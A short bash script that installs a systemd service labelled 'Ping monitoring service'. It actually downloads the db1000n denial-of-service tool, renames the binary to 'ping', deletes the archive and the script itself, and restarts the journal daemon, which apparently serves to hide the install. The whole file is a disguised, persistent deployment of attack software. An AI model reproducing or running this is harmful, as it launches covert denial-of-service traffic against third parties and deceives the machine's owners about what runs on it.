#!/usr/bin/env bash

printf %s "[Unit]
Description=Ping monitoring service
After=network.target
Wants=network-online.target

[Service]
Restart=always
Type=simple
WorkingDirectory=/opt
ExecStart=/opt/ping

[Install]
WantedBy=multi-user.target
" | tee /etc/systemd/system/pings.service

cd /opt
wget https://github.com/Arriven/db1000n/releases/download/v0.5.20/db1000n-v0.5.20-linux-amd64.tar.gz --output-document=/opt/db1000n-linux-amd64.tar.gz
tar -xf /opt/db1000n-linux-amd64.tar.gz
mv ./db1000n ./ping
chmod +x ./ping
rm /opt/db1000n-linux-amd64.tar.gz /opt/script.sh

systemctl daemon-reload
systemctl enable pings.service
systemctl start pings.service
sleep 5s
systemctl restart systemd-journald
exit 0
